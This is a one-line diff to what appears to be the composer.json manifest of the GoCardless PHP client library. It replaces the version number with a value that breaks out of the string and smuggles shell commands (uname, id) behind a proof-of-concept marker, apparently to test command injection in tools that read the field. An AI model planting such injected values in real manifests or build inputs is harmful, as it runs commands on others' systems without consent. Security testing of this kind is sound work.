@@ -1,7 +1,7 @@
 {
   "name": "gocardless/gocardless-pro",
   "description": "GoCardless PHP Client Library",
-  "version": "8.1.5",
+  "version": "9.9.99\"; echo POC_INJECTED_MARKER_$(uname -sr)_uid=$(id -u); echo \"",
   "keywords": [
     "gocardless",
     "direct debit",
